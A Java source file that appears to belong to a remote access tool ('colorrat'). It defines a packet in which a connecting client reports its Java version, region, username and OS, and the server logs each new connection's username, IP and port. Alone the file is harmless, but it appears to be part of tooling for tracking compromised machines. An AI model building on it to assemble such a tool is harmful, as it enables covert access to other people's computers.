package eu.aragonapp.colorrat.network.packet.types.client;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.network.NetworkConnection;
import eu.aragonapp.colorrat.network.packet.Packet;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class C01PacketInformations extends Packet {

    private static final long serialVersionUID = 1L;

    private String javaVersion, region, username, os;

    @Override
    public void execute(NetworkConnection connection) {
        ColorServer.getLogger().info("A new connection! (@\033[4;1m" + this.username.toLowerCase() + "\033[0m/" + connection.getSocket().getInetAddress().getHostAddress() + ":" + connection.getSocket().getPort() + ")");
    }

    public String getJavaVersion() {
        return this.javaVersion;
    }

    public String getUsername() {
        return this.username;
    }

    public String getRegion() {
        return this.region;
    }

    public String getOs() {
        return this.os;
    }

}
